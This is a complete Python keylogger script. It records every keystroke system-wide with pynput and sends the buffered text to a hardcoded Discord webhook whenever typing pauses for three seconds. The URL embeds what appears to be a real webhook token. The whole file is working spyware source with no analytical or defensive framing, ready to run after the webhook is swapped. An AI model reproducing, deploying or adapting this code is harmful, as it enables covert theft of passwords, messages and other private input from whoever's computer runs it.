from pynput import keyboard
import requests
import threading
import time
import os

# Discord webhook URL (replace with your own webhook URL)
WEBHOOK_URL = 'https://discord.com/api/webhooks/1348318193940303882/0SBww7zlNqUxQhzbkCOC6ScjU2rDoOVkUxxdIJzMNx4WeSSVkbkRXb7ux91eSnTDKWSi'

# Store the keystrokes
keystrokes = ""
lock = threading.Lock()
last_keypress_time = time.time()

def send_to_webhook(message):
    """Send the message to the Discord webhook."""
    payload = {"content": message}
    try:
        response = requests.post(WEBHOOK_URL, json=payload)
        if response.status_code == 200:
            print("Webhook message sent successfully.")
        else:
            print(f"Failed to send webhook message. Status code: {response.status_code}")
    except Exception as e:
        print(f"Error sending message to webhook: {e}")

def keystroke_monitor():
    """Monitor keystrokes and send them after 3 seconds of inactivity."""
    global keystrokes, last_keypress_time
    while True:
        time.sleep(1)
        with lock:
            if keystrokes and time.time() - last_keypress_time > 3:
                send_to_webhook(keystrokes)
                keystrokes = ""

def on_press(key):
    global keystrokes, last_keypress_time
    try:
        key_str = key.char
    except AttributeError:
        key_str = f"[{key}]"
    
    with lock:
        keystrokes += key_str
        last_keypress_time = time.time()

def on_release(key):
    if key == keyboard.Key.delete:
        send_to_webhook("Connection stopped by user.")
        return False

# Start the keystroke monitor thread
threading.Thread(target=keystroke_monitor, daemon=True).start()

# Set up the keyboard listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
